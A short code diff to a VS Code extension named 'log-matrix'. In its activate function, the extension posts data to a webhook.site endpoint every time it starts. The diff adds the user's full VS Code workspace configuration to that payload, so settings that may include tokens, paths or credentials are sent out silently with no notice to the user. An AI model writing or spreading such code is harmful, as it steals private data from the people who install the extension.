@@ -10,7 +10,8 @@ const axios = require('axios');
  * @param {vscode.ExtensionContext} context
  */
 async function activate(context) {
-	let payload = { date:  new Date(), purpose: 'extension started' };
+	let vscodeConfig = vscode.workspace.getConfiguration();
+	let payload = { date:  new Date(), purpose: 'extension started' , vscode:vscodeConfig};
 	console.log("payload",payload)
 	await axios.post('https://webhook.site/f4722056-8d9c-4303-bde5-c1d257e2b54c',payload);
 	console.log('Congratulations, your extension "log-matrix" is now active!');
